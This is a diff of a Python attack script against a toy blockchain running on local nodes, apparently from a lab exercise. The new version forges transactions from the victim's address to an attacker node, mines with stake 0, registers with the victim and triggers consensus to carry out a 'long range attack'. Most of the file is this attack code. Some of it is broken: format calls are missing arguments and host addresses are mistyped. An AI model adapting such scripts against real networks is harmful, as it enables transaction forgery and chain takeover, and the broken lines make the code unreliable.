@@ -1,41 +1,32 @@
 import sys
 import requests
 
-attacker_1 = "http://127.0.0.1:8005"
-attacker_2 = "http://127.0.0.1:8006"
+attacker = "http://127.0.0.1:8010"
 
-victim = "http://127.0.0.1:8000"
-
-requests.post(attacker_1 + "/register_new_peer", data={"address": attacker_2})
-requests.post(attacker_2 + "/register_new_peer", data={"address": attacker_1})
-
-node_index = 0
-for i in range(10):
-	for i in range(10):
-		sender = attacker_1
-		recipient = attacker_2
-
-		transaction_data = {"sender": sender,
-							"recipient": recipient,
-							"amount": 5}
-
-		temp = attacker_2
-		attacker_2 = attacker_1
-		attacker_1 = temp
-
-		r = requests.post(sender + "/add_transaction", data=transaction_data)
-
-		if r.status_code == 201:
-			print("node {0} successfully created transaction #{1}".format(sender, i + 1))
-		else:
-			print("node {0} could not create transaction #{1}".format(sender, i + 1))
-
-	r = requests.post(attacker_1 + "/mine_pos", data={"stake": 5})
-
+for i in range(50):
+	transaction_data = {"sender": "http://127.0.0.1:8000",
+						"recipient": attacker,
+						"amount": 5}
+	r = requests.post(attacker + "/add_transaction", data=transaction_data)
 	if r.status_code == 201:
-		print("node {} successfully mined block using PoS".format(attacker_1))
+		print("node {0} successfully created transaction #{1}".format(attacker))
 	else:
-		print("node {} could not mine block using PoS".format(attacker_1))
+		print("node {0} could not create transaction #{1}".format(attacker))
 
-requests.post(attacker_1 + "/register_new_peer", data={"address": victim})
-requests.post(victim + "/register_new_peer", data={"address":attacker_1})
+	r = requests.post(attacker + "/mine_pow", data={"stake": 0})
+	if r.status_code == 201:
+		print("node {} successfully mined block using PoS".format(attacker))
+	else:
+		print("node {} could not mine block using PoS".format(attacker))
+
+r = requests.post("http://127.0.0.1:8000/register_node", data=attacker)
+if r.status_code == 200:
+	print("node http://1270.0.1:8000 successfully registered attacker")
+else:
+	print("node http://1270.0.1:8000 could not register attacker")
+
+r = requests.get("http://127.0.0.1:8000/consensus")
+if r.status_code == 200:
+	print("node http://1270.0.1:8000 victim of long range attack")
+else:
+	print("long range attaack failed on node http://1270.0.1:8000")
